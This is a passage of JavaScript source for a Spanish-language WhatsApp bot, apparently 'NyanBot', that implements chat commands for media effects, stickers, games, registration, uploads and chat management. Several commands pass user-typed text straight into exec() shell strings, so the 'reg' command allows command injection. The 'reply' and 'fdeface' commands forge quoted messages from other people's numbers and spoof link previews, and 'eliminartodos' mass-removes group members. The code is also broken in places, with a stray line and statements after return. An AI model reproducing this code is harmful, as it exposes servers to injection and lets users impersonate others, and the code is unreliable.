encmediav3 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav4 = await samu330.downloadAndSaveMediaMessage(encmediav3)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${mediav4} -filter:v "split [main][tmp]; [tmp] crop=iw:ih/2:0:0, vflip [flip]; [main][flip] overlay=0:H/2" ${ran}`, (err) => {
fs.unlinkSync(mediav4)
if (err) return reply(`Err: ${err}`)
buffer4533 = fs.readFileSync(ran)
samu330.sendMessage(from, buffer4533, video, { mimetype: 'video/mp4', quoted: fvid, caption: '*VIDEO EFFECT BY SAMU330*', sendEphemeral: true })
fs.unlinkSync(ran)
})
addFilter(from)
break


case 'vefecto':

if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
 
encmediav5 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav5 = await samu330.downloadAndSaveMediaMessage(encmediav5)
ran = getRandom('.mp4')
exec(`ffmpeg -y -i ${mediav5} -strict experimental -vf hue=s=0 -vcodec mpeg4 -b 2097152 -r 30 ${ran} `, (err) => {
fs.unlinkSync(mediav5)
if (err) return reply(`Err: ${err}`)
buffer4534 = fs.readFileSync(ran)
samu330.sendMessage(from, buffer4534, video, { mimetype: 'video/mp4', quoted: fvid, caption: '*VIDEO EFFECT BY SAMU330*', sendEphemeral: true })
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'sinsonido':


if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
 
encmediav6 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav6 = await samu330.downloadAndSaveMediaMessage(encmediav6)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${mediav6} -vcodec copy -an ${ran}`, (err) => {
fs.unlinkSync(mediav6)
if (err) return reply(`Err: ${err}`)
buffer4536 = fs.readFileSync(ran)
samu330.sendMessage(from, buffer4536, video, { mimetype: 'video/mp4', quoted: fvid, caption: '*VIDEO EFFECT BY SAMU330*', sendEphemeral: true })
fs.unlinkSync(ran)
})
addFilter(from)
break

	
case '+volumen':
if (!isQuotedAudio) return reply('Porfavor etiqueta una audio con el comando!')
reply('*Espera un momento porfavor....*')
encmediav = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav = await samu330.downloadAndSaveMediaMessage(encmediav)
exec(`ffmpeg -i ${mediav} -filter:a "volume=1.5" 'output.wav'`)
samu330.sendMessage(from, fs.readFileSync(`output.wav`), audio, { mimetype: 'video/mp3', quoted: fvid, duration: -999999 })
break

/*-------------[ Tictactoe Handler ]-------------*/
case 'tictactoe':
case 'ttt':
if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮 Tictactoe Game 🎳*

Actualmente hay una sesión de juego grupal\n\n@${boardnow.X} VS @${boardnow.O}

❌ : @${boardnow.X}
⭕ : @${boardnow.O}

Girar : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}


${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


`;
samu330.sendMessage(from, chatMove, MessageType.text, {
quoted: ftoko,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(
`Etiqueta a quien quieras que sea ser tu oponente!\n\nEjemplo : *${prefix}ttt <@tag>*`
);
	const boardnow = setGame(`${from}`);
	console.log(`NUEVA SECCION DE TTT ${boardnow.session}`);
	boardnow.status = false;
	boardnow.X = sender.replace("@s.whatsapp.net", "");
	boardnow.O = argss[1].replace("@", "");
	fs.writeFileSync(
		 `./lib/tictactoe/db/${from}.json`,
		 JSON.stringify(boardnow, null, 2)
);
const strChat = `*🎮 Iniciar el juego tictactoe 🎳*

@${sender.replace(
		 "@s.whatsapp.net",
		 ""
)} desafio a convertirte en un oponente del juego

_[ ${argss[1]} ] Escribe "S"o "N" para aceptar o rechazar el juego._ 
`;
samu330.sendMessage(from, strChat, MessageType.text, {
quoted: ftoko,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break
case 'delttc':
	// if(!isOwner && !revz.key.fromMe) return vean.sendMessage(id, yan, MessageType.text);
if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
reply(`Sesión eliminada con éxito en este grupo!`);
} else {
reply(`No hay sesión en curso.`);
}
break



case 'wa.me':
case 'wame':
samu330.updatePresence(from, Presence.composing)
options = {
text: `Link de WhatsApp: *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*O tambien puedes usar:*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, options, MessageType.text, {
quoted: ftoko
})
break

case 'bug':
if (!isRegister) return reply(mess.only.usrReg)
const pesan = args.join(' ')
if (pesan.length > 300) return samu330.sendMessage(from, 'Lo siento texto demasiado largo, máximo 300 caracteres', msgType.text, {quoted: sam})
var nomor = sam.participant
const teks1 = `*[REPORT]*\nNumero : @${nomor.split("@s.whatsapp.net")[0]}\nProblema : ${pesan}`

var options = {
text: teks1,
contextInfo: {mentionedJid: [nomor]},
}
samu330.sendMessage('5219984907794@s.whatsapp.net', options, text, {quoted: sam})
reply('El problema ha sido informado al propietario del BOT, informe falso o broma, sera ban definitivo.')
break
			
case 'reg':
if (isRegister) return reply('*Tu cuenta ya estaba verificada*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO DE REGISTRO:* ${prefix}reg *nombre|edad*`)
const nombre = q.substring(0, q.indexOf('|') - 0)
const edad = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(20)
const momento = require('moment-timezone')
const time = momento.tz('America/Mexico_City').format('HH:mm:ss')
if(isNaN(edad)) return await reply('*La edad es un numero🙄*!!')
if (nombre.length >= 10) return reply(`*Tu nombre es acaso un tren?*\nUn nombre no puede tener mas de *10* letras`)
if (edad > 30) return reply(`Uuuu, yastas viejito:c\n*Lo siento pero no puedo registrarte si eres mayor de 30 años*`)
if (edad < 13) return reply(`Eres menor de 13 años, no puedo hacer un registro tuyo lo siento.\n*Si quieres muestrame una autorizacion de tus padres diciendo que puedes pasar tiempo usando este bot para que pueda aceptarte:d*`)
try {
ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
veri = sender                                                
addRegisteredUser(sender, nombre, edad, time, serialUser)
try {
exec(`magick './src/reg.jpg' -gravity west -fill '#00FF00' -font './src/font-gue.ttf' -size 1280x710 -pointsize 90 -interline-spacing 7.5 -annotate +460-45 '${nombre}' -pointsize 50 -annotate +460+200 '${serialUser}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'regsm.jpg'`)
samu330.sendMessage(from, fs.readFileSync('./regsm.jpg'), MessageType.image, { quoted: sam, caption: `*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`})
} catch {
reply(`*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`)
}
addFilter(from)
break

case 'owner':
case 'creador':
await wa.sendContact(from, '5219984907794', "🥇𝑺𝒂𝒎𝒖𝟑𝟑𝟎🛺💨")
break
			
case 'smeme':
gh = body.slice(7).replace(/ /g, '%20')
wo1 = gh.split("|")[0];
wo2 = gh.split("|")[1];
if ((isMedia && !sam.message.videoMessage || isQuotedImage)) {
jars = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
wors = await samu330.downloadAndSaveMediaMessage(jars)
datae = await imageToBase64(JSON.stringify(wors).replace(/\"/gi, ''))
fs.writeFileSync('smeme.jpeg', datae, 'base64')
anu = await uploadImages('smeme.jpeg')
baleg = await getBuffer(`https://api.memegen.link/images/custom/${wo1}/${wo2}.png?background=${anu}`)
samu330.sendMessage(from, baleg, MessageType.image, {quoted: sam})
}
break
case 'noprefix':
prefix = ''
reply(`*EL PREFIJO YA NO ES NECESARIO AHORA!*`)
break
		
case 'api':
api = `${q}`
reply(`*La api a cambiado a ${q}!*`)
break
			
case 'shortlink':
url = args.join(" ")
request(`https://tinyurl.com/api-create.php?url=${url}`, function (error, response, body) {
try {
reply(body)
} catch (e) {
reply(e)
}
})
break
        
case 'exif':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (args.length < 1) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
if (!arg.split('|')) return reply(`Forma de uso: *${prefix}exif nombre|autor*`)
exif.create(q.split('|')[0], q.split('|')[1])
reply(`*El nombre de paquete de Stiker a cambiado a:* _${arg.split('|')[0]}\n*Y el autor a:* ${arg.split('|')[1]}`)
break
			
case 'scdl':
var url = budy.slice(6)
var res1 = await axios.get(`https://lindow-api.herokuapp.com/api/dlsoundcloud?url=${url}&apikey=${apikey}`)
var { title, result } = res1.data
thumbb = await getBuffer(`${res1.data.image}`)
samu330.sendMessage(from, thumbb, MessageType.image, {caption: `${title}`})
audiony = await getBuffer(result)
samu330.sendMessage(from, audiony, MessageType.audio, {mimetype: 'audio/mp4', filename: `${title}.mp3`, quoted: sam})
break
			
case 'par':
pares = await axios.get(`https://lindow-api.herokuapp.com/api/ppcouple?apikey=${apikey}`)
var { male, female } = pares.data.result
picmale = await getBuffer(`${male}`)
samu330.sendMessage(from, picmale, image, {quoted: fimg})
picfemale = await getBuffer(`${female}`)
samu330.sendMessage(from, picfemale, image, {quoted: fimg})
break
			
case 'animevid':
url = `https://lindow-api.herokuapp.com/api/randomaesthetic?apikey=${apikey}`
estetik = await getBuffer(url)
samu330.sendMessage(from, estetik, MessageType.video, {mimetype: 'video/mp4', duration : 999999999, filename: `estetod.mp4`, quoted: fvid, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
break
			
case 'asupan':
url = `https://lindow-api.herokuapp.com/api/asupan?apikey=${apikey}`
asupan = await getBuffer(url)
samu330.sendMessage(from, asupan, MessageType.video, {mimetype: 'video/mp4', duration : 999999999,filename: `asupan.mp4`, quoted: fvid, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
break
			
case 'swm':
case 'stickerwm':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
if (!arg.includes('|')) return reply(`Envie o etiquete una imagen con el comando: *${prefix}swn nombre|autor*`)
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = arg.split('|')[0]
const author1 = arg.split('|')[1]
exif.create(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('error')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), fliveLoc)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
if (!arg.includes('|')) return reply(`Envie o etiquete un video/gif con el comando: *${prefix}swm nombre|autor*`)
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const media = await samu330.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
const packname1 = arg.split('|')[0]
const author1 = arg.split('|')[1]
exif.create(packname1, author1, `stickwm_${sender}`)
reply('wait')
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply('error')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
}
addFilter(from)
break
		
case 'upmp3':
const mp312 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mp311 = await samu330.downloadAndSaveMediaMessage(mp312)
const { ext } = await fromBuffer(mp311) || {}
  		const form1 = new FormData
  		form1.append('file', mp311, 'tmp.' + ext)
  		let res12 = await fetch('https://file.io/?expires=1d', {
   		method: 'POST',
    		body: form1
  		})
  		const jsona = await res12.json()
  		if (!jsona.success) throw jsona
  		return jsona.link
		reply(jsona.link)
		reply(jsona.success)
break
		
	case 'up2':
		const mp3121 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mp3111 = await samu330.downloadAndSaveMediaMessage(mp3121)
		 let form = new FormData
  let buffers = mp3111
  if (!Array.isArray(mp3111)) buffers = [mp3111]
  for (let buffer of buffers) {
    form.append('file', buffer)
  }
  let res = await fetch('https://storage.restfulapi.my.id/upload', {
    method: 'POST',
    body: form
  })
  let json = await res.text()
  try {
    json = JSON.parse(json)
    if (!Array.isArray(inp)) return json.files[0].url
    return json.files.map(res => res.url)
  } catch (e) {
    throw json
  }
		reply(res.url)
		break
			
case 'pornode':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
query = args.join(' ')
get_result = await getJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${api}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Titulo   : ${x.title}\n`
ini_txt += `Vistas   : ${x.views}\n`
ini_txt += `Duracion : ${x.duration}\n`
ini_txt += `Uploader : ${x.uploader}\n`
ini_txt += `Link     : ${x.link}\n`
ini_txt += `Imagen   : ${x.thumbnail}\n`
}
reply(ini_txt)
addFilter(from)
break
		
case 'xvid':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Japonesas`)
query = args.join(' ')
get_result = await getJson(`https://fxc7-api.herokuapp.com/api/search/xvideos?apikey=Fxc7&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Titulo   : ${x.title}\n`
ini_txt += `Duracion : ${x.duration}\n`
ini_txt += `Uploader : ${x.channel.name}\n`
ini_txt += `Link     : ${x.url}\n\n╼━━━━━━━━━━━━━━━━━━━━━━━━━━╾\n`
}
reply(ini_txt)
addFilter(from)
break
		


case 'lucky':
a = '🍇'
b = '🍎'
c = '🍓'
e = '🍑'
f = '💰'
g = '🥝'
pw = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck = pw[Math.floor(Math.random() * pw.length)]
pw1 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck1 = pw1[Math.floor(Math.random() * pw1.length)]
pw2 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck2 = pw2[Math.floor(Math.random() * pw2.length)]
pw3 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck3 = pw3[Math.floor(Math.random() * pw3.length)]
pw4 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck4 = pw4[Math.floor(Math.random() * pw4.length)]
pw5 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck5 = pw5[Math.floor(Math.random() * pw5.length)]
pw6 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck6 = pw6[Math.floor(Math.random() * pw6.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
pw7 = [`${a}`, `${b}`, `${c}`, `${e}`, `${f}`, `${g}`]
luck7 = pw7[Math.floor(Math.random() * pw7.length)]
s = `┃ │  ${luck} │  ${luck1} │ ${luck2}`
a = `┃ │  ${luck3} │  ${luck4} │ ${luck5}`
m = `┃ │  ${luck6} │  ${luck7} │ ${luck7}`
u = `┌ ﹍﹍𝈺﹉﹉﹉𝈻﹍﹍ ┐ 
╭──╼┥𝈸𖾗ᷤ𖾕꯭ͣ𖾔꯭𖾔ͫ𖽙ͧ𝈹┝╾──╮
╽ ┌──────────┐ ┃
${s}
┃ ├──────────┤ ┃
${a}
┃ ├──────────┤ ┃
${m}
╿ └──────────┘ ╿
╰─┨⃞🔮𝉃𝜄𝜐𝉃𝜍𝜅𝉃𝛾🔮⃞ ┠─╯`
reply(`${u}`)
break

case 'eliminartodos': 
if (!isGroup) return reply('Este comando solo se puede usar en grupos!')
if (!botAdmin) return reply('Solo se puede usar cuando el bot es administrador!')
const allMem = await samu330.getGroupMembers(from)
for (let i = 0; i < allMem.length; i++) {
if (groupAdmins.includes(allMem[i].id)) {

} else {
await samu330.removeParticipant(from, allMem[i].id)
}
}
reply('✍🏻')
break

		
case 'getbio':
var yy = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
var p = await samu330.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("[ERROR 401] Status Profile Not Found")
}
addFilter(from)
break
case 'getpic':
if (sam.message.extendedTextMessage != undefined){
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
try {
pic = await samu330.getProfilePicture(mentioned[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
samu330.sendMessage(from, thumb, MessageType.image, {caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
}
addFilter(from)
break
case 'fdeface':
var nn = budy.slice(9)
var urlnye = nn.split("|")[0];
var titlenye = nn.split("|")[1];
var descnye = nn.split("|")[2];
run = getRandom('.jpeg')
var media1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ddatae = await imageToBase64(JSON.stringify(media2).replace(/\"/gi, ''))
samu330.sendMessage(from, {
text: `${urlnye}`,
matchedText: `${urlnye}`,
canonicalUrl: `${urlnye}`,
description: `${descnye}`,
title: `${titlenye}`,
jpegThumbnail: ddatae }, 'extendedTextMessage', { detectLinks: false })
break

c
case 'runtime':
run = process.uptime()
let text = msg.runtime(run)
samu330.sendMessage(from, '*Tiempo encendido*', MessageType.text, { quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"title": `${text}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "𝒩𝓎𝒶𝓃ℬ𝑜𝓉🍃",
"productImageCount": 10
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}                                                                                                                                                                                                                                                                        })
break

case 'archivar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Vale, espera..*')
console.log('succes archive chat = ' + from)
await sleep(3000)
samu330.modifyChat(from, ChatModification.archive)
reply('*Yap*')
break
case 'vaciartodo':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Todos los chats han sido vaciados*')
smyprry = await samu330.chats.all()
for (let _ of smyprry) {
await sleep(4000)
samu330.modifyChat(_.jid, ChatModification.delete)
}
break
case 'vaciar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Este chat a sido vaciado*')
console.log('succes delete chat = ' + from)
await sleep(4000)
samu330.modifyChat(from, ChatModification.delete)
break
case 'silencio':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.mute, 24*60*60*1000)
reply('*Este chat a sido silenciado*')
console.log('succes mute chat = ' + from)
break
case 'desilenciar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.unmute)
reply('*Este chat a dejado de silenciarse*')
console.log('succes unmute chat = ' + from)
break
case 'facebook':
case 'fb':
if (!isUrl) return reply('Y el Link?')
if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply('*Seas mmon... link de Facebook!!!*')
 
hx.fbdown(q)
.then(result => {
reply(result)
sendMediaURL(from,result,`*Link Del Video*`)
})
break



case 'ytsearch':
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
resvi = await yts(q)
searchyt = ``
for (let i of resvi.all) {
searchyt += `
*Titulo :* ${i.title}
*ID Video :* ${i.videoId}
*Vistas :* ${i.views}
*Subido :* ${i.ago}
*Duracion :* ${i.timestamp}
*Channel :* ${i.author.name}
*Link Channel :* ${i.author.url}
*Link Video :* ${i.url}
`
}
var samusamuxd = searchyt.trim()
sendFileFromUrl(resvi.all[0].image, image, {quoted: fimg, caption: samusamuxd, sendEphemeral: true})
addFilter(from)
break

case 'tts':
case 'voz':
if (args.length < 1) return samu330.sendMessage(from, 'Y el codigo de idioma? escribe el comando *idiomas* para ver la lista', text, { quoted: ftoko })
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return samu330.sendMessage(from, 'Escribe el texto', text, {quoted: floc})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 300
? reply('Mira, si no sabes usar esto... mejor no lo agas 😤')
: gtts.save(ranm, dtt, function() {
samu330.updatePresence(from, Presence.recording)
samu330.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: fliveLoc, mimetype: 'audio/mp4', duration: -999999999999999999, ptt:true, sendEphemeral: true, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
fs.unlinkSync(ranm)
})
addFilter(from)
break
case 'estadopic':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var textodestatusxd = args.join(' ')
reply('*Espera un momento...*')
var foto = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
var inisiap2 = fs.readFileSync(inisiap)
samu330.sendMessage('status@broadcast', inisiap2, MessageType.image, {quoted: ftoko, caption: `${textodestatusxd}`})
reply('*SE ENVIO LA IMAGEN COMO ESTADO*')
break
case 'estadovid':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Espera un momento...*')
var foto = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
var inisiap2 = fs.readFileSync(inisiap)
samu330.sendMessage('status@broadcast', inisiap2, MessageType.video, {quoted: ftoko, caption: `${body.slice(12)}`})
reply('Se envio el video al estado!')
break
case 'estado':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var estadotxt = args.join(' ')
samu330.sendMessage('status@broadcast', estadotxt, MessageType.text)
reply('*SE ENVIO EL ESTADO*')
break
case 'marcarsinleer':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var chats11 = await samu330.chats.all()
chats11.map( async ({ jid }) => {
await samu330.chatRead(jid, 'unread')
})
var teks = `\`\`\`Se an marcado como NO LEIDOS ${chats.length} chats !\`\`\``
await samu330.sendMessage(from, teks, MessageType.text, {quoted: fdoc})
console.log(chats.length)
break
case 'leertodo':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var chats12 = await samu330.chats.all()
chats12.map( async ({ jid }) => {
await samu330.chatRead(jid)
})
var teks = `\`\`\`Se an leido ${chats.length} chats !\`\`\``
await samu330.sendMessage(from, teks, MessageType.text, {quoted: floc})
console.log(chats.length)
break
case 'reply':
if (!args) return reply(`Uso :\n${prefix}reply [52xxx|frase|frase]]\n\nEx : \n${prefix}reply 0|hola wasa|que pex`)
var ghh = args.join(' ')
var nomorr = ghh.split("|")[0];
var target = ghh.split("|")[1];
var bot = ghh.split("|")[2];
samu330.sendMessage(from, `${bot}`, MessageType.text, {quoted: { key: { fromMe: false, participant: nomorr+'@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
break
case 'fordward':
samu330.sendMessage(from, `${budy.slice(10)}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true }})
break

case 'todos':
samu330.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
if (!isRegister) return reply(mess.only.usrReg)
if (!isAdmin) return reply(mess.only.admin)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim(): ''
teks += `  Total : ${groupMembers.length}\n`
for (let mem of groupMembers) {
teks += `┃ @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions('*〈 Mención grupal 〉*\n╭┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n┝ ● '+teks+'┊┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n┊────🪀 *Samu330* 🪀────\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈', members_id, true)
addFilter(from)
break 
		
case 'notificar':

if (!isAdmin) return reply(mess.only.admin)
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
teks = `Notificación dada por @${sender.split("@")[0]}\n*Mensaje : ${args.join(' ')}*`
const groupN = await samu330.groupMetadata(from);
member = groupN['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: teks,
contextInfo: {
mentionedJid: jids, "forwardingScore": 9999, "isForwarded": true
},
quoted: faud
}
addFilter(from)
await samu330.sendMessage(from, options, MessageType.text)
break
case 'leermas':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)

if (args.length < 1) return reply(`Escribe el texto\nEjemplo : ${prefix}readmore te amo/rdido un perro?`)
tels = body.slice(9)
var teksa = tels.split("/")[0];
var teks2 = tels.split("/")[1];
